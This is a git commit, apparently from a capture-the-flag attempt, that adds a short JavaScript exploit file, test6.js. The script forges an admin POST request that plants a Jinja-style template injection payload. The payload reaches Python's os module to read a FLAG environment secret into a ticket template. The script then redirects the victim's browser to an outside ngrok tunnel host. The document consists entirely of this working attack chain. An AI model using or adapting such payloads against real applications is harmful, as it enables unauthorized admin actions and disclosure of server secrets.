0c6f469099c4c012d310e5c4dd0efc31a2e50897
Matěj Volf <git@mvolfik.com>
2026-04-23 09:18:51 +0200

    stash

---
+++ test6.js
@@ -0,0 +1,11 @@
+fetch("/admin/templates/1/edit", {
+  method: "POST",
+  body: "name=Default+Ticket+Template&html_content=" +
+    encodeURIComponent("testaa<h1>{{ event_name }}</h1><p>{{ buyer_name }}</p><p>{{ ticket_code }} {{ self.__init__.__globals__.__builtins__.__import__('os').environ['FLAG'] }}bagr6</p>") +
+    "&is_default=on",
+  headers: {
+    "content-type": "application/x-www-form-urlencoded"
+  }
+})
+
+document.location = "https://eaf3-195-113-197-234.ngrok-free.app/botvisit"
